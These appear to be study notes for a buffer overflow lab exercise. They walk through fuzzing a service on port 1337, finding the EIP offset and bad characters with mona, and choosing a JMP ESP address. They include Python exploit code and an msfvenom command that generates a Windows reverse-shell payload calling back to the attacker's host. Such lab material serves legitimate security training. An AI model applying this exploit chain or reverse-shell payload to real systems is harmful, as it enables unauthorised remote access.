## Config Mona Work Folder

`!mona config -set workingfolder c:\mona\%p`

The `%p` means the process name.



## Fuzz

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Check how many bytes required to crash the program.



## Replicate Crash & Get EIP offset

```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Using Metasploit's tool to create a payload of a length more than the previous result.

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l len`

Place the payload into the file above.



In debugger, run `!mona findmsp -distance len`

It will output the EIP offset. Place it into the file.

We can validate it by replacing the payload to `BBBB` , executing again, and the resulting EIP should be `42424242` (B = 42)



## Find Bad Characters

`!mona bytearray -b "\x00"` 

Generating file to compare.

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Generating payload to send.



Crash again and run `!mona compare -f C:\mona\%p\bytearray.bin -a <address>`

address means the resulting ESP register info.

**Some Bad Char will corrupter other char as well**



## Find Jump Point

`!mona jmp -r esp -cpb "Bad Char starting \x00"`

It will displayed all jmp instructions's addresses that do not contain any bad char.

Choose one and reverse it into the retn.



## Generate Payload

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "Bad Char" -f c`



## Prepend

We need to reverse some space in the memory for the payload to extract itself.

Like `padding = "\x90" * 16` `\x90` is NOP.



## Exploit

Execute and get shell.

